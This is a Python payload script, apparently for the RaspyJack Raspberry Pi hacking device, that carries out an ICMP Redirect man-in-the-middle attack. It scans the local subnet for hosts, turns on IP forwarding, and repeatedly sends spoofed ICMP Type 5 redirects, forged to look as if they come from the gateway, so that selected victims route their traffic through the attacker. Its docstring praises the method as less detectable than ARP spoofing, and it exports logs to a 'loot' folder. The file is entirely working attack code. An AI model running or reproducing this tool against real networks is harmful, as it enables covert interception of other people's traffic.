#!/usr/bin/env python3
"""
RaspyJack Payload -- ICMP Redirect
====================================
Author: 7h30th3r0n3

ICMP Redirect attack for traffic rerouting without ARP spoofing.
Sends ICMP Redirect (Type 5) messages to target hosts telling them
to route traffic through the Pi.  Less detectable than ARP spoofing
(many IDS do not monitor ICMP redirects).

Auto-detects gateway and target subnet.  Can scan for live hosts
before sending redirects.

Controls:
  OK         -- Start / Stop redirecting
  UP / DOWN  -- Select target from discovered hosts
  KEY1       -- Scan for live hosts on subnet
  KEY2       -- Export redirect log
  KEY3       -- Exit

Setup: Enable IP forwarding.  Some modern OS ignore ICMP redirects.
"""

import os
import sys
import time
import json
import re
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, IP, ICMP, UDP,
        sendp, send, sniff as scapy_sniff, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/ICMPRedirect"
os.makedirs(LOOT_DIR, exist_ok=True)

ROWS_VISIBLE = 5
REDIRECT_INTERVAL = 5   # seconds between redirect bursts

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
redirecting = False
hosts = []              # list of {"ip": ..., "mac": ...}
selected_idx = 0
scroll_pos = 0
redirects_sent = 0
active_targets = []     # IPs currently being redirected
status_msg = "Ready"
my_iface = "eth0"
my_ip = "0.0.0.0"
gateway_ip = ""
gateway_mac = ""
view_mode = "hosts"     # hosts | active

_redirect_thread = None
_scan_thread = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run_cmd(cmd, timeout=10):
    """Run command and return result."""
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def _run_silent(cmd, timeout=5):
    """Run command ignoring errors."""
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def _get_default_iface():
    """Get the interface with the default route."""
    try:
        result = _run_cmd(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_gateway_ip():
    """Get default gateway IP."""
    try:
        result = _run_cmd(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


def _get_iface_ip(iface):
    """Read IPv4 address of our interface."""
    try:
        result = _run_cmd(["ip", "-4", "addr", "show", "dev", iface])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "0.0.0.0"


def _get_subnet(iface):
    """Get subnet in CIDR notation for the interface."""
    try:
        result = _run_cmd(["ip", "-4", "addr", "show", "dev", iface])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1]
    except Exception:
        pass
    return ""


def _get_iface_mac(iface):
    """Read MAC of our interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# Host scanning
# ---------------------------------------------------------------------------

def _scan_hosts():
    """Scan subnet for live hosts using arp-scan or nmap."""
    global status_msg

    with lock:
        status_msg = "Scanning..."

    subnet = _get_subnet(my_iface)
    if not subnet:
        with lock:
            status_msg = "No subnet found"
        return

    found = []
    try:
        result = _run_cmd(
            ["sudo", "arp-scan", "--interface", my_iface, subnet],
            timeout=30,
        )
        for line in result.stdout.splitlines():
            match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})", line, re.I)
            if match:
                ip = match.group(1)
                mac = match.group(2).lower()
                if ip != my_ip and ip != gateway_ip:
                    found.append({"ip": ip, "mac": mac})
    except FileNotFoundError:
        try:
            result = _run_cmd(["sudo", "nmap", "-sn", subnet], timeout=30)
            current_ip = ""
            for line in result.stdout.splitlines():
                ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if ip_match:
                    current_ip = ip_match.group(1)
                mac_match = re.search(r"([0-9A-F]{2}(?::[0-9A-F]{2}){5})", line, re.I)
                if mac_match and current_ip and current_ip != my_ip:
                    if current_ip != gateway_ip:
                        found.append({"ip": current_ip, "mac": mac_match.group(0).lower()})
                    current_ip = ""
        except Exception:
            pass
    except Exception:
        pass

    with lock:
        hosts.clear()
        hosts.extend(found)
        status_msg = f"Found {len(found)} hosts"


# ---------------------------------------------------------------------------
# ICMP Redirect sending
# ---------------------------------------------------------------------------

def _send_redirect(target_ip, gw_ip, my_ip_addr):
    """
    Send ICMP Redirect to target telling it to use our IP as gateway
    for the real gateway's IP.

    ICMP Redirect: Type 5, Code 1 (host redirect)
    The packet must appear to come from the gateway.
    """
    try:
        # The ICMP redirect must contain the original IP header + 8 bytes
        # that triggered the redirect.  We fake a packet from target to
        # an external IP routed via the gateway.
        trigger = IP(src=target_ip, dst="8.8.8.8") / UDP(sport=12345, dport=53)
        trigger_bytes = bytes(trigger)

        pkt = (
            IP(src=gw_ip, dst=target_ip)
            / ICMP(type=5, code=1, gw=my_ip_addr)
            / IP(src=target_ip, dst="8.8.8.8")
            / UDP(sport=12345, dport=53)
        )
        send(pkt, iface=my_iface, verbose=False)
        return True
    except Exception:
        return False


def _redirect_loop():
    """Continuously send ICMP Redirects to active targets."""
    global redirects_sent

    while running and redirecting:
        with lock:
            targets = list(active_targets)
            gw = gateway_ip
            me = my_ip

        for target in targets:
            if not running or not redirecting:
                break
            if _send_redirect(target, gw, me):
                with lock:
                    redirects_sent += 1

        # Sleep in chunks for responsiveness
        for _ in range(REDIRECT_INTERVAL * 10):
            if not running or not redirecting:
                break
            time.sleep(0.1)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_log():
    """Export redirect log to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": my_iface,
            "my_ip": my_ip,
            "gateway_ip": gateway_ip,
            "redirects_sent": redirects_sent,
            "active_targets": list(active_targets),
            "discovered_hosts": [dict(h) for h in hosts],
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"icmp_redirect_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "ICMP REDIRECT", fill="RED", font=font)

    with lock:
        st = status_msg
        redir = redirecting
        sp = scroll_pos
        si = selected_idx
        host_list = list(hosts)
        act_list = list(active_targets)
        rs = redirects_sent
        gw = gateway_ip
        vm = view_mode

    redir_label = "ON" if redir else "OFF"
    redir_color = "GREEN" if redir else "GRAY"
    draw.text((90, 2), redir_label, fill=redir_color, font=font)

    draw.text((2, 14), st[:22], fill="WHITE", font=font)
    draw.text((2, 26), f"GW:{gw}  Sent:{rs}", fill="GRAY", font=font)
    draw.text((2, 38), f"Targets: {len(act_list)}", fill="YELLOW", font=font)

    if vm == "hosts":
        y = 52
        visible = host_list[sp:sp + ROWS_VISIBLE]
        for i, h in enumerate(visible):
            real_i = sp + i
            is_active = h["ip"] in act_list
            prefix = ">" if real_i == si else " "
            if real_i == si:
                color = "YELLOW"
            elif is_active:
                color = "GREEN"
            else:
                color = "WHITE"
            marker = "*" if is_active else " "
            line = f"{prefix}{marker}{h['ip']}"
            draw.text((2, y), line[:22], fill=color, font=font)
            y += 14

        if not visible:
            draw.text((2, 60), "K1=Scan for hosts", fill="GRAY", font=font)

    # Footer
    draw.text((2, 116), "OK:Redir K1:Scan K3:Quit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, redirecting, scroll_pos, selected_idx, status_msg
    global my_iface, my_ip, gateway_ip, gateway_mac, active_targets
    global view_mode, _redirect_thread, _scan_thread

    try:
        if not SCAPY_OK:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((4, 50), "scapy not found!", font=font, fill="RED")
            draw.text((4, 65), "pip install scapy", font=font, fill="GRAY")
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(3)
            GPIO.cleanup()
            return 1

        my_iface = _get_default_iface()
        my_ip = _get_iface_ip(my_iface)
        gateway_ip = _get_gateway_ip()
        gateway_mac = _get_iface_mac(my_iface)

        # Enable IP forwarding
        _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])

        with lock:
            status_msg = f"{my_iface} GW:{gateway_ip}"

        # Initial scan
        _scan_thread = threading.Thread(target=_scan_hosts, daemon=True)
        _scan_thread.start()

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    if not redirecting:
                        # Add selected host to active targets if not already
                        if 0 <= selected_idx < len(hosts):
                            target_ip = hosts[selected_idx]["ip"]
                            if target_ip not in active_targets:
                                active_targets.append(target_ip)
                        if active_targets:
                            redirecting = True
                            status_msg = "Redirecting..."
                    else:
                        redirecting = False
                        status_msg = "Stopped"

                if redirecting and (_redirect_thread is None or not _redirect_thread.is_alive()):
                    _redirect_thread = threading.Thread(
                        target=_redirect_loop, daemon=True,
                    )
                    _redirect_thread.start()
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if selected_idx > 0:
                        selected_idx -= 1
                    if selected_idx < scroll_pos:
                        scroll_pos = selected_idx

            elif btn == "DOWN":
                with lock:
                    if selected_idx < len(hosts) - 1:
                        selected_idx += 1
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        scroll_pos = selected_idx - ROWS_VISIBLE + 1

            elif btn == "KEY1":
                if _scan_thread is None or not _scan_thread.is_alive():
                    _scan_thread = threading.Thread(
                        target=_scan_hosts, daemon=True,
                    )
                    _scan_thread.start()
                time.sleep(0.3)

            elif btn == "KEY2":
                threading.Thread(target=_export_log, daemon=True).start()
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False
        redirecting = False

        # Disable IP forwarding
        _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 50), "ICMP Redirect off", fill="YELLOW", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
